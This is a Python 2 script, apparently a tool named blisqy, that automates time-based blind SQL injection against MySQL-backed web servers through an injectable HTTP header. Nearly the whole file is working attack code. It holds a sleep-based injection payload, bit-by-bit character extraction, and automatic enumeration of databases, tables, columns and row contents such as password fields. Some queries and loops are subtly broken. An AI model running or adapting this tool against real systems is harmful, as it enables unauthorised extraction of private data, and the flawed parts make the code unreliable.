#!/usr/bin/python

from socket import (socket, AF_INET, SOCK_STREAM )
import optparse
import time
import sys

def testSql(sql,sleepTime):
    '''Tests for blind sql injection. If it takes time (> 0.5) to execute a query then True, else False '''

    # Connect to webserver
    try:
        s = socket(AF_INET,SOCK_STREAM, 0)
        s.connect((server,port))

        # Mark time before execution
        t1 = time.time()
        
                
        trigger = "' or if((%s),sleep(0.9),0) and '1'='1" % sql
        
        # Send our Payload
        data = ""
        data += "GET / HTTP/1.1\r\n"
        data += "Host: "
        data += server+"\r\n"
        data += vulnHeader
        data += ": "
        data += headerValue+trigger+"\r\n"
        data += "Connection: close\r\n\r\n"
        
        s.send(data)
        s.recv(0)
    
        # Mark time after execution
        t2 = time.time()
    
        # Compare if time diffrence is greater than sleepTime
        if t2-t1 > sleepTime:
            return True
        else:
            return False
            
    except Exception as error:
        print red + str(error) + clear


def constructor(x,inj,sleepTime):
    '''Use bit masking to retrieve each bit value of a character and rebuild it '''

    strx = ""

    # values for bit masking `for x in range(0,8): 2**x`
    for i in (1,2,4,8,16,32,64,128):
        
        # If injection worked with the bit mask on, True=1, else False=0; Append on strx
        if testSql("select ascii(substring((%s),%s,1))&%s" % (inj,x,i),sleepTime) == True:
            strx+="1"
        else:
            strx+="0"

    #Get integer value from binary value stored at strx
    ascy = int(strx,2)

    # Since value is stored in revrse order, rearrange the byte order
    revAscy = int('{:08b}'.format(ascy)[::-1],2)
    
    # Get ASCII value
    alpha = chr(revAscy)
    
    # If string terminator == ascii, signal for a break in the while loop
    if alpha == "\0":
        return "done"
    else:
        return alpha

def DataPump(x,payload,sleepTime):
           
    result = ""
    
    while True:
        try:
            if constructor(x,payload,sleepTime) != "done":
                xf = constructor(x,payload,sleepTime)
                result+=xf
                x+=1
            elif result == "done":
                print red + "[-] Nothing found!" + clear
                break
            else:
                return result
                break 
        except KeyboardInterrupt:
            print "Key-board Interrupt"
            print "stopping....."
            exit()

def StatusUpdate(payload):
    print cyan+"Extracting Data from ====> %s : %s %s" % (server,port,clear) 
    print green + "Current Payload : " + clear + red + payload + clear
    breaker = cyan + "==================================================================" + clear
    print breaker

def BreakPoint(message):
    print "\n"
    userAction =  yellow + message + clear
    ans = raw_input(userAction)
    #ans = ans.tolower()
    if (ans == "n") | (ans == "no"):
        msg=  yellow + "Close Sessions? yes/no : " + clear
        action = ans = raw_input(msg)
        
        if (action == "y") | (action == "yes"):
            sys.exit()


def tableDigger(table):
    print cyan + "Preparing to Enumerate Table : %s" % table + clear
    line = cyan + "=====================================================" + clear
    print line
    
    # Get Number of Columns in a Table
    print green + "[+] Getting Number of Columns in Table : %s" % table + clear
    #CountColumns = "Select count(*) from (SELECT column_name FROM information_schema.columns WHERE table_name=%s AND table_schema != 'mysql' AND table_schema != 'information_schema') t" % table
    CountColumns = "SELECT count(*) from (SELECT column_name FROM information_schema.columns WHERE table_name = '%s') t" % table
    CountedColumns = DataPump(x,CountColumns,sleepTime)
   
    print yellow + "[-] " + CountedColumns + clear
    print "\n"

    columns = []
    counter = 1
    
    # Get column names and put in a list columns
    print green + "[+] Getting  all Column Names in Table : %s " % table + clear
                   
    while counter <= int(CountedColumns):
        GetColumn = "select column_name FROM (select column_name FROM information_schema.columns WHERE table_name='%s' AND table_schema != 'mysql' AND table_schema != 'information_schema' order by column_name limit %d) t order by column_name desc limit 1" % (table,counter)
        column = DataPump(x,GetColumn,sleepTime)
        columns.append(column)
        counter = counter +1
        
    for column in columns:
        print yellow + "[-] " + column + clear
    
    print "\n"
          
    # Get all rows in a Table
    print green + "[+] Getting number of Rows in Table : %s " % table + clear
    allRows = "select count(*) from (select * from %s) t" % table
    CountedRows = DataPump(x,allRows,sleepTime)
    print yellow + "[-] " + CountedRows + clear
    print "\n"

    rows = []
    counter = 1
    
    # Get all data from rows
    print green + "[+] Getting data from Table : %s ." % table + clear
    outMsg = red + "Enter Columns for output separated by a dash (-). e.g id-fname-passwd  : " + clear
    OutputColumns = raw_input(outMsg)
    
    
    if OutputColumns != 'skip':
        OutputColumns = OutputColumns.replace("-",",':',")
        print OutputColumns
        
        while counter <= int(CountedRows):
            getRow = "select result from (%s) result from users %s by result limit %d) t order by result desc limit 1" % (OutputColumns,table,counter)
            row = DataPump(x,getRow,sleepTime)
            rows.append(row)
            counter = counter +1
        
        for row in rows:
            print yellow + "[-] " + row + clear
    
    elif OutputColumns == 'skip':
        print red + "Skipping....." + clear
    




def MysqlDigger(sleepTime,interactive):
    # Get Current Database
    print green + "[+] Getting Current Database : " + clear
    
    currentDB = "select database()"
    DBname = DataPump(x,currentDB,sleepTime)
   
    print yellow + "[-] " + DBname + clear
    print "\n"
    
    
    # Count number of TABLES available in non system schema (to be used in getting tableNames)
    print green + "[+] Getting  number of TABLES from Schema " + clear
    
    tableCount = "select count(*) from (SELECT table_name FROM information_schema.tables WHERE table_schema != 'mysql' AND table_schema != 'information_schema') t"
    CountedTables = DataPump(x,tableCount,sleepTime)
    
    print yellow + "[-] " + CountedTables + clear
    print "\n"
    
    counter = 1
    tables = []
    
    # Get all TABLE_NAMES from schema, increment inner limit till total counted TABLES available
    print green + "[+] Getting  all TABLE NAMES from Schema " + clear
    
    while counter <= int(CountedTables):
        GetTableName = "select table_name from (SELECT table_name FROM information_schema.tables WHERE table_schema != 'mysql' AND table_schema != 'information_schema' order by table_name limit %d) t order by table_name desc limit 1" % counter
        TableName = DataPump(x,GetTableName,sleepTime)
        
        print yellow + "[-] " + TableName + clear
        
        tables.append(TableName)
        counter = counter +1


    # Get all TABLE_NAMES from all Columns from discovered Tables
    if interactive == "on":
        
        msg = "Get all Columns from discovered Tables? yes/no  :  "
        BreakPoint(msg)
        print "\n"
    
        for table in tables:
            tableDigger(table)
            
    elif interactive == "off":
        for table in tables:
            tableDigger(table)
            
if __name__ == '__main__':
       
    value = 0
    x = 1
    
    #Colors for Notifications and Errors
    red = "\x1b[1;31m"
    cyan = "\x1b[1;36m"
    green = "\x1b[1;32m"
    yellow = "\x1b[1;33m"
    clear = "\x1b[0m"
    
    # Check if options are correctly passed
    parser = optparse.OptionParser('blisqy.py --server <Web Server> --port <port> --header <vulnerable header> --hvalue <header value> --inject <point of injection>  --payload <custom sql payload> --dig <yes/no> ')
    
    parser.add_option('--server', dest='Webserver', type='string', help='Specify host (web server) IP')
    parser.add_option('--port', dest='Port', type='int', help='Specify port')
    parser.add_option('--header', dest='VulnHeader', type='string', help='Provide a vulnerable HTTP Header')
    parser.add_option('--hvalue', dest='HeaderValue', type='string',help='Specify the value for the vulnerable header')
    parser.add_option('--inject', dest='Injection', type='string', help='Provide where to inject Sqli payload')
    parser.add_option('--payload', dest='Payload', type='string', help='Provide SQL statment/query to inject as payload')
    parser.add_option('--dig', dest='Digger', type='string', help='Automatic Mysql-Schema enumeration (takes time!)' )
    parser.add_option('--sleeptime', dest='Sleep', type='float', help='Sleep-Time for blind-SQLi query (default : 0.9)')
    parser.add_option('--interactive', dest='interact', type='string', help='Turn interactive mode on/off (default : off)')
    (options, args) = parser.parse_args()
    
    global server
    global port
    global vulnHeader
    global headerValue
    global payload
    global injection
    global mysqldig
    
    
    server = options.Webserver
    port = options.Port
    vulnHeader = options.VulnHeader
    headerValue = options.HeaderValue
    payload = options.Payload
    injection = options.Injection
    mysqldig = options.Digger
    sleepTime = options.Sleep
    interactive = options.interact
    
    if (sleepTime == None):
        sleepTime = 0.9
    
    if (interactive == None):
        interactive = "off"
    
    if (server == None) | (port == None) | (vulnHeader == None) | (headerValue == None ):
        print "Please Provide All Required Arguments!"
        print red+"USAGE:"+clear
        print cyan + parser.usage + clear
        sys.exit(0)
               
    elif (payload != None) & (mysqldig == None):
        StatusUpdate(payload)
        SqlQuery = DataPump(x,payload,sleepTime)
        print yellow + SqlQuery + clear
        
    elif (mysqldig == "yes") | (mysqldig == "Yes") | (mysqldig == "YES" ):
        MysqlDigger(sleepTime,interactive)
    